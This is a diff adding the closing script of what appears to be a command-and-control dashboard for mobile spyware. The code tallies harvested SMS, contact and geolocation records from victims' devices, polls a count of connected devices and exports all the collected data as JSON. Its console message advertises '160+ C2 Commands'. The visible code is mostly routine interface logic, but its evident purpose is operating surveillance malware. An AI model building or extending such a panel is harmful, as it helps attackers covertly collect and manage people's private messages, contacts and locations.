+    var contacts = data.filter(function(d) { return d.sumber === 'kontak' || d.sumber === 'kontak_all'; });
+    var loc = data.filter(function(d) { return d.sumber === 'lokasi' || d.sumber === 'geolocation_browser'; });
+    
+    document.getElementById('statTotal').textContent = data.length;
+    document.getElementById('statSMS').textContent = sms.length;
+    document.getElementById('statContacts').textContent = contacts.length;
+    document.getElementById('statLocation').textContent = loc.length;
+}
+
+// ============================================================
+// UPDATE DEVICE COUNT
+// ============================================================
+function updateDeviceCount() {
+    fetch('/data?type=devices&key=' + PASSWORD)
+        .then(function(r) { return r.json(); })
+        .then(function(data) {
+            if (data && data.count) {
+                document.getElementById('deviceCount').textContent = '📱 ' + data.count + ' Devices';
+            }
+        })
+        .catch(function() {});
+}
+
+function filterData() { renderData(allData); }
+
+function exportData() {
+    var blob = new Blob([JSON.stringify(allData, null, 2)], { type: 'application/json' });
+    var url = URL.createObjectURL(blob);
+    var a = document.createElement('a');
+    a.href = url;
+    a.download = 'data_export_' + Date.now() + '.json';
+    a.click();
+}
+
+// ============================================================
+// LOGS
+// ============================================================
+function addLog(type, message) {
+    var entry = { time: new Date().toLocaleTimeString('id-ID'), type: type, message: message };
+    logEntries.unshift(entry);
+    renderLogs();
+}
+
+function renderLogs() {
+    var area = document.getElementById('logArea');
+    var search = document.getElementById('logSearch').value.toLowerCase();
+    var filtered = logEntries;
+    if (search) {
+        filtered = filtered.filter(function(e) {
+            return e.message.toLowerCase().includes(search) || e.type.includes(search);
+        });
+    }
+    area.innerHTML = filtered.slice(0, 200).map(function(e) {
+        return '<div class="log-entry"><span class="time">[' + e.time + ']</span> <span class="type">[' + e.type + ']</span> <span class="data">' + e.message + '</span></div>';
+    }).join('');
+}
+
+function filterLogs() { renderLogs(); }
+function clearLogs() { logEntries = []; renderLogs(); }
+
+// ============================================================
+// MODAL
+// ============================================================
+function openModal(content) {
+    document.getElementById('modalBody').innerHTML = content;
+    document.getElementById('modal').classList.add('active');
+}
+function closeModal() {
+    document.getElementById('modal').classList.remove('active');
+}
+
+// ============================================================
+// KEYBOARD SHORTCUT
+// ============================================================
+document.addEventListener('keydown', function(e) {
+    if (e.key === 'Escape') { closeModal(); }
+});
+
+console.log('✅ Dashboard loaded - 160+ C2 Commands!');
+</script>
+</body>
+</html>
